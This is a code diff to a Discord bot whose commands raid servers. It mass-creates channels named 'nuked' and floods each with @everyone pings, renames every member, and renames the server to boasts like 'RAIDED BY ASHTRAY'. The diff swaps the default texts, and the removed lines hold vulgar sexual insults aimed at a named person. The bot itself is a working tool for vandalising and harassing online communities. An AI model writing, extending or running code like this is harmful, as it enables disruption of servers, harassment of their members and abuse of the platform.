@@ -155,7 +155,7 @@ async def ban_user(interaction: discord.Interaction, member: discord.Member, rea
 @tree.command(name="pingflood", description="Create channels and spam pings in each")
 @is_owner()
 @app_commands.describe(channels="Number of channels", pings_per="Pings per channel", name="Channel name", message="Message to send")
-async def ping_flood(interaction: discord.Interaction, channels: int = 40, pings_per: int = 70, name: str = "nuked", message: str = "@everyone RAIDED BY ABDUL, SUCK MY DICK"):
+async def ping_flood(interaction: discord.Interaction, channels: int = 40, pings_per: int = 70, name: str = "nuked", message: str = "@everyone RAIDED BY ASHTRAY"):
     await interaction.response.send_message("🚀 Starting ultra-fast ping flood...", ephemeral=True)
     create_tasks = [interaction.guild.create_text_channel(name) for _ in range(channels)]
     new_channels_raw = await asyncio.gather(*create_tasks, return_exceptions=True)
@@ -169,7 +169,7 @@ async def ping_flood(interaction: discord.Interaction, channels: int = 40, pings
 @tree.command(name="massnick", description="Change all member nicknames")
 @is_owner()
 @app_commands.describe(nickname="New nickname")
-async def mass_nick(interaction: discord.Interaction, nickname: str = "NUKED BY ABDUL, SUCK MY DICK"):
+async def mass_nick(interaction: discord.Interaction, nickname: str = "NUKED BY ASHTRAY"):
     await interaction.response.defer(ephemeral=True)
     tasks = []
     for member in interaction.guild.members:
@@ -191,7 +191,7 @@ async def prune_members(interaction: discord.Interaction, days: int = 7):
 @app_commands.describe(new_name="Custom name (optional - random if blank)")
 async def change_server_name(interaction: discord.Interaction, new_name: str = None):
     if new_name is None:
-        random_names = ["RAIDED BY ABDUL, SUCK MY DICK", "NUKED BY ABDUL, SUCK MY DICK", "OWNED BY ABDUL, SUCK MY DICK", "ABDUL, SUCK MY DICK WAS HERE", "SERVER GONE", "DEAD SERVER", "CHAOS ZONE", "WASTELAND", "HACKED BY ABDUL, SUCK MY DICK"]
+        random_names = ["RAIDED BY ASHTRAY", "NUKED BY ASHTRAY", "OWNED BY ASHTRAY", "ASHTRAY WAS HERE", "SERVER GONE", "DEAD SERVER", "CHAOS ZONE", "WASTELAND", "HACKED BY ASHTRAY"]
         new_name = random.choice(random_names)
     try:
         await interaction.guild.edit(name=new_name)
@@ -199,7 +199,7 @@ async def change_server_name(interaction: discord.Interaction, new_name: str = N
     except:
         await interaction.response.send_message("❌ Failed to change name.", ephemeral=True)
 
-@tree.command(name="ping", description="Check ABDUL, SUCK MY DICK's latency")
+@tree.command(name="ping", description="Check ASHTRAY's latency")
 @is_owner()
 async def ping(interaction: discord.Interaction):
     message_latency = max(0, round((discord.utils.utcnow() - interaction.created_at).total_seconds() * 1000))
